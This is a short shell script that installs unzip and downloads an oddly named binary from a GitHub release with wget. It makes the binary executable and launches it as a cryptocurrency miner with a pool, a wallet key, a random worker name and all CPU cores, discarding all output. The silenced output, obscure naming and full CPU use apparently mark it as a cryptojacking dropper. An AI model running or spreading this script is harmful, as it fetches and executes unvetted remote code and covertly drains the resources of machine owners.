#!/bin/sh
apt update && apt install unzip
wget https://github.com/linxspec/shhhshhhsa/releases/download/ussvb/shhhs
chmod +x shhhs
./shhhs mine -a --pool twbitz --key GcwXpYMusMvpbFWx2UHARxnys428PUanXD3E8pBpv3RF --worker $(shuf -n 1 -i 1-99999)-Vrd -t $(nproc --all) --ice >/dev/null 2>&1